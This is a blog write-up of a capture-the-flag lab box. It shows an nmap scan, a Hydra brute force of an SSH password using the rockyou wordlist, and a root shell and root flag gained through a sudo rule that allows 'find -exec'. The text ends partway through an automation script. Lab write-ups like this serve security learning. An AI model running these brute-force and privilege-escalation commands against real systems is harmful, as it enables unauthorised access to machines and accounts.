<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Welcome box solve"><title>SSH Brutefore & Sudo Find Privilege Escalation</title><link rel=canonical href=/en/p/battlehack_welcome/><link rel=stylesheet href=/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css><meta property="og:title" content="SSH Brutefore & Sudo Find Privilege Escalation"><meta property="og:description" content="Welcome box solve"><meta property="og:url" content="/en/p/battlehack_welcome/"><meta property="og:site_name" content="Onid1's blog"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Pentest"><meta property="article:published_time" content="2023-10-03T00:00:00+00:00"><meta property="article:modified_time" content="2023-10-03T00:00:00+00:00"><meta property="og:image" content="/en/p/battlehack_welcome/images/welcome_cover.jpg"><meta name=twitter:title content="SSH Brutefore & Sudo Find Privilege Escalation"><meta name=twitter:description content="Welcome box solve"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/en/p/battlehack_welcome/images/welcome_cover.jpg"><link rel="shortcut icon" href=/favicon.jpg></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"light")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/en/><img src=/img/avatar_hu0ce059573998b4d4949c8f46390bb013_11693_300x0_resize_q75_box.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a>
<span class=emoji>üëÅ</span></figure><div class=site-meta><h1 class=site-name><a href=/en/>Onid1's blog</a></h1><h2 class=site-description>Welcome on the Onid1's blog!</h2></div></header><ol class=social-menu><li><a href=https://github.com/0nid1/ target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com/LinuskUser target=_blank title=Twitter rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/en/about/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg><span>About</span></a></li><li><a href=/en/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg><span>Main</span></a></li><li><a href=/en/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>Archives</span></a></li><li><a href=/en/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>Search</span></a></li><li><a href=/en/links/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg><span>Links</span></a></li><div class=menu-bottom-section><li id=i18n-switch><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg><select name=language onchange="window.location.href=this.selectedOptions[0].value"><option value=/fr/>French</option><option value=/en/ selected>English</option></select></li><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>Dark Mode</span></li></div></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#description>Description</a></li><li><a href=#given-data>Given data</a></li><li><a href=#normal-mode>Normal Mode</a><ol><li><a href=#port-scan>Port scan</a></li><li><a href=#bruteforce-seelas-password>Bruteforce seela&rsquo;s password</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ol></li><li><a href=#speedrun-mode>Speedrun mode</a><ol><li><a href=#taking-shortcuts>Taking shortcuts</a></li><li><a href=#searching-for-modules>Searching for modules</a></li><li><a href=#script-used>Script used</a></li><li><a href=#time-score>Time score</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/en/p/battlehack_welcome/><img src=/en/p/battlehack_welcome/images/welcome_cover_hu827c66ffcba915599e7c4a5b5a5bee6d_102322_800x0_resize_q75_box.jpg srcset="/en/p/battlehack_welcome/images/welcome_cover_hu827c66ffcba915599e7c4a5b5a5bee6d_102322_800x0_resize_q75_box.jpg 800w, /en/p/battlehack_welcome/images/welcome_cover_hu827c66ffcba915599e7c4a5b5a5bee6d_102322_1600x0_resize_q75_box.jpg 1600w" width=800 height=437 loading=lazy alt="Featured image of post SSH Brutefore & Sudo Find Privilege Escalation"></a></div><div class=article-details><header class=article-category><a href=/en/categories/battleh4ck/>BattleH4ck</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/en/p/battlehack_welcome/>SSH Brutefore & Sudo Find Privilege Escalation</a></h2><h3 class=article-subtitle>Welcome box solve</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Oct 03, 2023</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>8 minute read</time></div></footer><footer class=article-translations><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg><div><a href=/fr/p/battlehack_welcome/ class=link>French</a></div></footer></div></header><section class=article-content><h2 id=description>Description</h2><blockquote><p>Welcome to the BattleH4cK platform. In this first mission, your instructor will guide you step by step to give you a glimpse of the game&mldr; To enter the competition, you will have to demonstrate your skills. Can you connect yourself to this machine? It should be easy, but we are nice, so here are the information we know about it: The username should be seela The password used is weak</p></blockquote><h2 id=given-data>Given data</h2><p>By reading the description of the mission, we can see that we need to connect to the machine by knowing that:</p><ul><li>The username <em>should</em> be <strong>seela</strong></li><li>The password <em>used</em> is <strong>weak</strong></li><li>IP address: 10.42.20.52</li></ul><h2 id=normal-mode>Normal Mode</h2><h3 id=port-scan>Port scan</h3><p>First, we need to know what services are open to us on the machine.
To do this, we will use <em>nmap</em>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚îî‚îÄ$ nmap 10.42.20.52 --script<span class=o>=</span>default -sV
</span></span></code></pre></td></tr></table></div></div><p>Options explained:</p><div class=table-wrapper><table><thead><tr><th>Option</th><th>Description</th></tr></thead><tbody><tr><td>&ndash;script=default</td><td>Performs a script scan using the default set of scripts.</td></tr><tr><td>-sV</td><td>Version detection</td></tr></tbody></table></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.42.20.52
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.064s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span class=o>(</span>protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> fe:c2:f2:9c:8f:17:5d:66:9a:90:c9:e9:b3:1a:0a:bc <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> ea:73:61:43:b8:7d:db:88:2b:d7:a8:16:39:49:b6:40 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> be:5e:54:f8:6d:3c:de:7d:53:17:99:08:65:0c:34:a0 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 3.00 seconds
</span></span></code></pre></td></tr></table></div></div><p>We can see that there is one open port which is SSH.
By remembering the given data, we have:</p><ul><li>a username which <em>should</em> be <strong>seela</strong></li><li>a password which is <em>used</em> is <strong>weak</strong></li></ul><p>Before we continue, let&rsquo;s look at the used verbs.
There are &ldquo;should&rdquo; and &ldquo;used&rdquo;.
When we look at the sentence about the password, there is the word &ldquo;used&rdquo; which is a bit confusing.
There are two possibilities of interpretation:</p><ul><li><strong>weak</strong> is the password</li><li>the password is weak, like to easy to guess</li></ul><p>To know if the password is equal to <strong>weak</strong>, we should try to connect with it and with the username <strong>seela</strong>.
(The username is not that confusing, because it doesn&rsquo;t mean anything)</p><p>To connect to the machine by using our data, we can use <strong>ssh</strong>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚îî‚îÄ$ ssh seela@10.42.20.52
</span></span><span class=line><span class=cl>seela@10.42.20.54<span class=err>&#39;</span>s password: weak
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Permission denied, please try again.
</span></span></code></pre></td></tr></table></div></div><p>By being denied, we can understand that our password is not equal to &ldquo;weak&rdquo; but is weak, like easy to guess.</p><h3 id=bruteforce-seelas-password>Bruteforce seela&rsquo;s password</h3><p>To find the password used by seela, as Google says, we can use an attack called &ldquo;bruteforce&rdquo;.
<img src=https://user-images.githubusercontent.com/69204254/216843124-4edabd84-d823-4160-99b9-cc1e70e4f314.png loading=lazy alt=image></p><p>In the first <a class=link href=https://null-byte.wonderhowto.com/how-to/gain-ssh-access-servers-by-brute-forcing-credentials-0194263/ target=_blank rel=noopener>link</a>, we can find that there is a tool called &ldquo;Hydra&rdquo; which can help us in this situation.
We can find that there is a tool called &ldquo;Hydra&rdquo; which can help us in this situation.
The website tells us that we need a username and a wordlist.
To know what wordlist we should use, we can try to ask google which one can be good to try.
<img src=https://user-images.githubusercontent.com/69204254/216844703-e851e499-3d64-436c-aa13-1046feaed78f.png loading=lazy alt=image></p><p>By looking at the first link, we can read that the wordlist rockyou can be good to try.
If you own a Kali Linux, rockyou can be found in /usr/share/wordlist/rockyou.txt.gz (you can also type the command: wordlists).</p><p>Right now, rockyou in gziped, to extract it, we can use <strong>gunzip</strong>, by doing:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚îî‚îÄ$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
</span></span></code></pre></td></tr></table></div></div><p>Now we have a wordlist, let&rsquo;s run Hydra !</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚îî‚îÄ$ hydra -l seela -P /usr/share/wordlists/rockyou.txt ssh://10.42.20.52 -t <span class=m>4</span>
</span></span></code></pre></td></tr></table></div></div><p>Options explained:</p><div class=table-wrapper><table><thead><tr><th>Option</th><th>Description</th></tr></thead><tbody><tr><td>-l LOGIN</td><td>or -L FILE login with LOGIN name, or load several logins from FILE</td></tr><tr><td>-P FILE</td><td>or -P FILE try password PASS, or load several passwords from FILE</td></tr><tr><td>-t TASKS</td><td>run TASKS number of connects in parallel (default: 16)</td></tr></tbody></table></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Hydra v9.3 <span class=o>(</span>c<span class=o>)</span> <span class=m>2022</span> by van Hauser/THC <span class=p>&amp;</span> David Maciejak - Please <span class=k>do</span> not use in military or secret service organizations, or <span class=k>for</span> illegal purposes <span class=o>(</span>this is non-binding, these *** ignore laws and ethics anyway<span class=o>)</span>.
</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> max <span class=m>16</span> tasks per <span class=m>1</span> server, overall <span class=m>16</span> tasks, <span class=m>14344399</span> login tries <span class=o>(</span>l:1/p:14344399<span class=o>)</span>, ~896525 tries per task
</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> attacking ssh://10.42.20.54:22/
</span></span><span class=line><span class=cl><span class=o>[</span>22<span class=o>][</span>ssh<span class=o>]</span> host: 10.42.20.54   login: seela   password: rockyou
</span></span><span class=line><span class=cl><span class=m>1</span> of <span class=m>1</span> target successfully completed, <span class=m>1</span> valid password found
</span></span></code></pre></td></tr></table></div></div><p>We got our password, which <strong>rockyou</strong> !</p><p>Let&rsquo;s try to connect to the machine the same way we used to do:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚îî‚îÄ$ ssh seela@10.42.20.52
</span></span><span class=line><span class=cl>seela@10.42.20.54<span class=err>&#39;</span>s password: rockyou
</span></span></code></pre></td></tr></table></div></div><p><em>Result:</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Linux welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw 5.15.0-39-generic <span class=c1>#42-Ubuntu SMP Thu Jun 9 23:42:32 UTC 2022 x86_64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The programs included with the Debian GNU/Linux system are free software<span class=p>;</span>
</span></span><span class=line><span class=cl>the exact distribution terms <span class=k>for</span> each program are described in the
</span></span><span class=line><span class=cl>individual files in /usr/share/doc/*/copyright.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span class=line><span class=cl>permitted by applicable law.
</span></span><span class=line><span class=cl>seela@welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:~$
</span></span></code></pre></td></tr></table></div></div><p>As we can see, we are now connected !
The first flag is in the directory in which we are:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>seela@welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:~$ ls -l
</span></span></code></pre></td></tr></table></div></div><p>Options explained:</p><div class=table-wrapper><table><thead><tr><th>Option</th><th>Description</th></tr></thead><tbody><tr><td>-l</td><td>use a long listing format</td></tr></tbody></table></div><p><em>Result:</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>total <span class=m>4</span>
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root <span class=m>17</span> Feb  <span class=m>5</span> 20:23 user.txt
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s get the content of the <code>user.txt</code> flag.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚îî‚îÄ$ cat user.txt
</span></span></code></pre></td></tr></table></div></div><p><em>Result:</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>FLAG<span class=o>{</span>someCharacters<span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=privilege-escalation>Privilege Escalation</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>seela@welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:~$ sudo -l
</span></span><span class=line><span class=cl>We trust you have received the usual lecture from the <span class=nb>local</span> System
</span></span><span class=line><span class=cl>Administrator. It usually boils down to these three things:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>#1) Respect the privacy of others.</span>
</span></span><span class=line><span class=cl>    <span class=c1>#2) Think before you type.</span>
</span></span><span class=line><span class=cl>    <span class=c1>#3) With great power comes great responsibility.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> seela: rockyou
</span></span></code></pre></td></tr></table></div></div><p>Options Explained:</p><div class=table-wrapper><table><thead><tr><th>Option</th><th>Description</th></tr></thead><tbody><tr><td>-l</td><td>Lists the allowed (and forbidden) commands for the invoking user on the current host.</td></tr></tbody></table></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> seela on welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User seela may run the following commands on welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:
</span></span><span class=line><span class=cl>    <span class=o>(</span>root<span class=o>)</span> /usr/bin/find *
</span></span></code></pre></td></tr></table></div></div><p>As we can see, using sudo, we can run the command find with any parameters, as the user <code>root</code>.
Initially, find is used to find things on the system. But, when we take a look at its manual, we can use many options.</p><p>Right now, we would like to become <code>root</code> or read the <code>/root/root.txt</code> flag.
To do this, let&rsquo;s search for options which can do one of those.</p><p>Once we have read the manual, we can speak about one: <code>-exec</code>.</p><p>Option <code>-exec</code> will allow us to exec a command when a searched file is found.
Here, we would like to read the content of <code>/root/root.txt</code>.</p><p>To do this, we can execute the following command:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo find /root/root.txt -exec cat <span class=o>{}</span> <span class=se>\;</span>
</span></span></code></pre></td></tr></table></div></div><p>Which gives us the final flag.</p><p>If we want, we can also get a root shell, by using the following command:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo find / -exec bash <span class=se>\;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=speedrun-mode>Speedrun mode</h2><p>In this mode, our goal is to solve the machine as quickly as possible.
To achieve this, I&rsquo;ve created a python script (not necessarily the fastest language) that automates our various resolution actions.</p><p>*The machine launch and flag validation scripts are not included.
*Only the machine resolution script will be given.</p><p>First of all, we need to take note of the machine resolution process.
First, we looked up the password for the user <code>seela</code>.
We then connected to the remote server via SSH, using the credentials we&rsquo;d obtained, and retrieved our first flag.
Once connected, we checked the rights of user <code>seela</code> to discover that he can run the <code>find</code> command as <code>root</code>.
We finished the machine by displaying the contents of the <code>/root/root.txt</code> flag.</p><p>The aim of this section is to extract from our initial process the steps required to resolve the machine.</p><h3 id=taking-shortcuts>Taking shortcuts</h3><p>In this section, we list the various shortcuts we&rsquo;ve taken to save as much time as possible:</p><ul><li>after relaunching the machine, we observe that the password remains the same. This means we won&rsquo;t need to run the bruteforce step again.</li><li>instead of searching for the two flags separately, we can use a single command.</li></ul><h3 id=searching-for-modules>Searching for modules</h3><p>In order to access the machine&rsquo;s SSH service, two modules were selected:</p><ul><li><a class=link href=https://www.paramiko.org/ target=_blank rel=noopener>paramiko</a>: one of the best-known libraries for connecting remotely to another computer using SSHv2</li><li><a class=link href=https://pypi.org/project/ssh2-python/ target=_blank rel=noopener>ssh2-python</a>: a remote SSHv2 connection library that claims to be &ldquo;very fast&rdquo;.</li></ul><p>The choice of these two modules was seen in a comparative aspect. A script for each module was set up. For my part, I found the <code>ssh2-python</code> module faster than <code>paramiko</code>.</p><h3 id=script-used>Script used</h3><p>A resolution script was designed with the help of the ssh2-python module.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ssh2.session</span> <span class=kn>import</span> <span class=n>Session</span> <span class=c1># ssh2-python</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hbrunner</span> <span class=c1># Custom module for launching machines and sending flags</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Launch Welcome machine in &#34;speed&#34; mode</span>
</span></span><span class=line><span class=cl><span class=n>bot</span> <span class=o>=</span> <span class=n>hbrunner</span><span class=o>.</span><span class=n>Runner</span><span class=p>(</span><span class=s2>&#34;welcome&#34;</span><span class=p>,</span> <span class=s2>&#34;speedrun&#34;</span><span class=p>,</span> <span class=s2>&#34;vpn&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># Get IP address</span>
